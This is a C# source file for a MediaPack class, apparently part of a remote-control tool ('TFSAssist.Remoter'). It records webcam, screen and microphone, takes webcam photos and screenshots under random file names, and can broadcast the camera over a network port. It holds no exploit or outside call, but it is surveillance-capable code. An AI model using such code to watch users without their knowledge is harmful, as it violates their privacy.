using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Utils;
using Utils.WinForm.MediaCapture;
using Utils.WinForm.MediaCapture.AForge;
using Utils.WinForm.MediaCapture.Encoder;
using Utils.WinForm.MediaCapture.NAudio;
using Utils.WinForm.MediaCapture.Screen;

namespace TFSAssist.Remoter
{
    delegate void MediaPackCompleteHandler(object sender, string destinationFile);
    delegate void MediaPackErrorHandler(string log);
    class MediaPack
    {
        private readonly Thread _mainThread;
        private readonly string _projectDirPath;

        private AForgeMediaDevices _aforgeDevices;
        private AForgeCapture _aforgeCapture;
        private FFMPEGWriter _aforgeWriter;

        private EncoderMediaDevices _encDevices;
        private EncoderCapture _encoderCapture;

        private ScreenCapture _screenCapture;
        private FFMPEGWriter _screenWriter;

        private NAudioCapture _naudioCapture;

        public event MediaPackCompleteHandler OnCompleted;
        public event MediaPackErrorHandler ProcessingExceptions;

        public MediaPack(Thread mainThread, string projectDirPath)
        {
            _mainThread = mainThread;
            _projectDirPath = projectDirPath;
        }

        public void Initialize()
        {
            try
            {
                _aforgeDevices = new AForgeMediaDevices();
                _aforgeWriter = new FFMPEGWriter();
                _aforgeCapture = new AForgeCapture(_mainThread, _aforgeDevices, _aforgeWriter, _projectDirPath, 60);
                _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
                _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }


            try
            {
                _encDevices = new EncoderMediaDevices();
                _encoderCapture = new EncoderCapture(_mainThread, _aforgeDevices, _encDevices, _projectDirPath, 60);
                _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }


            _screenWriter = new FFMPEGWriter(13);
            _screenCapture = new ScreenCapture(_screenWriter, _projectDirPath, 60);
            _screenCapture.OnRecordingCompleted += OnRecordingCompleted;


            _naudioCapture = new NAudioCapture(_projectDirPath, 60);
            _naudioCapture.OnRecordingCompleted += OnRecordingCompleted;
        }

        public void StartAForge()
        {
            if (_aforgeCapture != null && _aforgeCapture.Mode == MediaCaptureMode.None && (_encoderCapture == null || _encoderCapture.Mode == MediaCaptureMode.None))
            {
                _aforgeCapture.StartRecording();
                if (_naudioCapture.Mode == MediaCaptureMode.None)
                {
                    _naudioCapture.StartRecording();
                }
            }
        }

        public void StartEncoder()
        {
            if (_encoderCapture != null && _encoderCapture.Mode == MediaCaptureMode.None && (_aforgeCapture == null || _aforgeCapture.Mode == MediaCaptureMode.None))
            {
                _encoderCapture.StartRecording();
            }
        }

        public void StartBroadcast(int port = 8080)
        {
            if (_encoderCapture != null && _encoderCapture.Mode == MediaCaptureMode.None && (_aforgeCapture == null || _aforgeCapture.Mode == MediaCaptureMode.None))
            {
                _encoderCapture.StartBroadcast(port);
            }
        }

        public void StartScreen()
        {
            if (_screenCapture != null && _screenCapture.Mode == MediaCaptureMode.None)
            {
                _screenCapture.StartRecording();
                if (_naudioCapture.Mode == MediaCaptureMode.None)
                {
                    _naudioCapture.StartRecording();
                }
            }
        }

        public void StartNAudio()
        {
            if (_naudioCapture.Mode == MediaCaptureMode.None)
            {
                _naudioCapture.StartRecording();
            }
        }

        public void Stop()
        {
            _aforgeCapture?.Stop();
            _encoderCapture?.Stop();
            _screenCapture?.Stop();
            _naudioCapture?.Stop();
        }

        private void OnRecordingCompleted(object sender, MediaCaptureEventArgs args)
        {
            if (args == null)
                return;

            if (args.Error != null)
                WriteExLog(args.Error);

            if (string.IsNullOrWhiteSpace(args.DestinationFile) || !File.Exists(args.DestinationFile))
                return;

            int tryCount = 0;
            while (!IO.IsFileReady(args.DestinationFile))
            {
                if (tryCount >= 5)
                    return;

                Thread.Sleep(1000);
                tryCount++;
            }

            if (sender is IMediaCapture mediaCapture)
            {
                OnCompleted?.Invoke(this, _projectDirPath);
            }
            else
            {
                WriteExLog(new Exception("UNEXPECTED! Sender is not IMediaCapture"));
            }
        }

        private void OnUnexpectedError(object sender, MediaCaptureEventArgs args)
        {
            if (args?.Error != null)
                WriteExLog(new Exception("UNEXPECTED!", args.Error));
        }

        public void SetSeconds(int timeRec = 30)
        {
            if (_aforgeCapture != null)
                _aforgeCapture.SecondsRecordDuration = timeRec;

            if (_encoderCapture != null)
                _encoderCapture.SecondsRecordDuration = timeRec;

            _screenCapture.SecondsRecordDuration = timeRec;

            _naudioCapture.SecondsRecordDuration = timeRec;
        }

        public void SetVideo(string video)
        {
            try
            {
                _aforgeCapture?.ChangeVideoDevice(video);
            }
            catch (Exception ex)
            {
                WriteExLog($"{ex.GetType()}=[{ex.Message}]");
            }

            try
            {
                _encoderCapture?.ChangeVideoDevice(video);
            }
            catch (Exception ex)
            {
                WriteExLog($"{ex.GetType()}=[{ex.Message}]");
            }
        }

        public void SetAudio(string audio)
        {
            try
            {
                _encoderCapture?.ChangeAudioDevice(audio);
            }
            catch (Exception ex)
            {
                WriteExLog($"{ex.GetType()}=[{ex.Message}]");
            }
        }

        public void SetFrames(int framesRate)
        {
            _screenWriter.FrameRate = framesRate;
        }

        public void GetScreen()
        {
            string imagePath = Path.Combine(_projectDirPath, $"{STRING.RandomString(15)}.png");
            ScreenCapture.Capture(imagePath, ImageFormat.Png);
        }

        public bool GetPhoto()
        {
            if (_aforgeCapture == null || _aforgeCapture.Mode != MediaCaptureMode.None)
                return false;

            Task<Bitmap> task = _aforgeCapture.GetPictureAsync();
            if (task.Wait(20000))
            {
                var photo = task.Result;
                if (photo != null)
                {
                    string photoPath = Path.Combine(_projectDirPath, $"{STRING.RandomString(15)}.png");
                    photo.Save(photoPath, ImageFormat.Png);
                }
            }

            return true;
        }

        void WriteExLog(string log)
        {
            ProcessingExceptions?.Invoke(log.ToString());
        }

        void WriteExLog(Exception log)
        {
            ProcessingExceptions?.Invoke(log.ToString());
        }

        public override string ToString()
        {
            string currentDevices = string.Empty;
            string resultCamInfo = string.Empty;

            if (_aforgeDevices != null)
            {
                if (_aforgeCapture != null)
                    currentDevices = $"AForge:\r\n{_aforgeCapture.ToString()}";
                resultCamInfo = _aforgeDevices.ToString();
            }

            if (_encDevices != null)
            {
                if (_encoderCapture != null)
                    currentDevices = currentDevices + $"\r\n\r\nEncoder:\r\n{_encoderCapture.ToString()}";
                resultCamInfo = resultCamInfo + "\r\n\r\n" + _encDevices.ToString();
            }

            if (resultCamInfo.IsNullOrEmptyTrim())
                resultCamInfo = "No cam device found.";
            else
                resultCamInfo = currentDevices.Trim() + "\r\n===================\r\n" + resultCamInfo;

            resultCamInfo = resultCamInfo + "\r\n===================\r\n";

            resultCamInfo = resultCamInfo + "Screen:\r\n" + _screenCapture.ToString();

            resultCamInfo = resultCamInfo + "\r\n===================\r\n";

            resultCamInfo = resultCamInfo + "NAudio:\r\n" + _naudioCapture.ToString();

            resultCamInfo = resultCamInfo.Trim();

            return resultCamInfo;
        }
    }
}